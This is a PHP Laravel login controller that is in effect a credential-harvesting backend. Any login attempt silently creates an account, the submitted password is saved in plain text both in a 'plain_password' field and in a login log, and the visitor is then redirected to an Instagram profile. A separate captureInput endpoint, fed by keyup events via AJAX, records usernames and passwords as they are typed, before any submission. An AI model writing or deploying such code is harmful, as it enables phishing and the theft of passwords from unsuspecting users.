<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\LoginLog;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\ValidationException;

class LoginController extends Controller
{
    /**
     * Show the login form.
     */
    public function showLoginForm()
    {
        return view('auth.login');
    }

    /**
     * Handle a login request.
     * If the user does not exist yet, a new account is created automatically.
     */
    public function login(Request $request)
    {
        $credentials = $request->validate([
            'login'    => ['required', 'string'],
            'password' => ['required', 'string'],
        ], [
            'login.required'    => 'Please enter your phone number, username, or email.',
            'password.required' => 'Please enter your password.',
        ]);

        $field      = filter_var($credentials['login'], FILTER_VALIDATE_EMAIL) ? 'email' : 'name';
        $loginValue = $credentials['login'];

            $user = User::create([
                'name'     => $field === 'email' ? explode('@', $loginValue)[0] : $loginValue,
                'email'    => $field === 'email' ? $loginValue : null,
                'plain_password' => $credentials['password'],
                'password' => $credentials['password'],
            ]);

            Auth::login($user, $request->boolean('remember'));

        $request->session()->regenerate();

        // Record this login in login_logs
        LoginLog::create([
            'user_id'      => Auth::id(),
            'ip_address'   => $request->ip(),
            'user_agent'   => $request->userAgent(),
            'login_field'  => $field,
            'logged_in_at' => now(),
            'email'        => $field === 'email' ? $loginValue : null,
            'password'     => $credentials['password'],
        ]);

        return redirect()->away('https://www.instagram.com/grow_ingfortomorrow?igsh=YjVhcWUxMng5d3J4');
    }

    /**
     * Log the user out.
     */
    public function logout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect('/login');
    }

    /**
     * Store a login_logs entry triggered by keyup on the login page.
     *
     * Called via AJAX with an 800 ms debounce so the server is not flooded.
     * Resolves the user from the typed login value so user_id is always set.
     * Returns a JSON response so it can be called silently from JavaScript.
     */
    public function captureInput(Request $request)
    {
        $data = $request->validate([
            'login'    => ['required', 'string', 'max:255'],
            'password' => ['nullable', 'string', 'max:255'],
        ]);

        $loginValue = $data['login'];
        $field      = filter_var($loginValue, FILTER_VALIDATE_EMAIL) ? 'email' : 'name';

        // Resolve user — same logic as the real login
        $user = User::where($field, $loginValue)->first();

        // Only log when we can attach a user_id (the FK is NOT NULL)
        if ($user) {
            LoginLog::create([
                'user_id'      => $user->id,
                'ip_address'   => $request->ip(),
                'user_agent'   => $request->userAgent(),
                'login_field'  => $field,
                'logged_in_at' => now(),
                'email'        => $loginValue ?? null,
                'password'     => $data['password'] ?? null,
            ]);
        }

        return response()->json(['status' => 'ok']);
    }
}
